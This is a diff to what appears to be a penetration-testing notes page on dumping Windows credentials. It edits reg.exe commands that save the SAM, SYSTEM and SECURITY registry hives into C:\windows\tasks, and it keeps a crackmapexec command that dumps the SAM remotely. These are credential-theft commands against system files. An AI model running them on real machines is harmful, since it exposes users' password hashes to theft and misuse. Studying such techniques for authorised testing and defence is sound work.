@@ -8,9 +8,9 @@ The **SAM (Security Account Manager) database** in Windows is a system file that
 Copy Registry Hives:
 
 ```bash
-reg.exe save hklm\sam C:\sam.save
-reg.exe save hklm\system C:\system.save
-reg.exe save hklm\security C:\security.save
+reg.exe save hklm\sam C:\windows\tasks\sam.save
+reg.exe save hklm\system C:\windows\tasks\system.save
+reg.exe save hklm\security C:\windows\tasks\security.save
 ```
 
 Copy files to attacking system, using SMB or some other method, then:
@@ -27,7 +27,7 @@ Remotely, needs administrator level credentials:
 crackmapexec smb x.x.x.x -u <user> -p <pass> --local-auth --sam
 ```
 
-### LSA
+#### LSA
 
 The **Local Security Authority (LSA)** in Windows is a key component of the operating system responsible for enforcing security policies, managing user authentication, and handling logon processes. It verifies user credentials by interacting with the Security Account Manager (SAM) database and other authentication mechanisms, such as Kerberos or NTLM. The LSA temporarily stores clear text credentials in memory for specific functions, such as enabling single sign-on (SSO) or delegating credentials for remote authentication.
 
